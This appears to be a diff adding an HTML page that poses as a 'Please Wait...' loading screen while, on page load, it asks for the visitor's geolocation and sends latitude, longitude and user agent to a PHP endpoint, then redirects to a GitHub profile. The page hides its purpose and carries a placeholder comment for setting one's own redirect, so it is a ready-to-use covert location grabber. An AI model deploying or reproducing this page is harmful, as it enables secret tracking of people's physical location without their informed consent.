@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<!--Your Redirect Url -->
+    <meta http-equiv = "refresh" content = "3; url = https://github.com/mronion420" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+  .disclaimer{
+
+    display: none;
+
+}
+
+.loader {
+  border: 16px solid #f3f3f3;
+  border-radius: 50%;
+  border-top: 16px solid #3498db;
+  width: 120px;
+  height: 120px;
+  -webkit-animation: spin 2s linear infinite; /* Safari */
+  animation: spin 2s linear infinite;
+}
+
+/* Safari */
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(0deg); }
+  100% { -webkit-transform: rotate(360deg); }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+
+  </head>
+    
+    
+<body onload="getLocation()">
+    
+ <center>
+   <div class="loader"></div>
+   <br>
+   <h1 style="color:red;">Please Wait...</h1>
+   </center>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "onion.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+    xhttp.send(); 
+}
+</script>
+
+</body>
+</html>
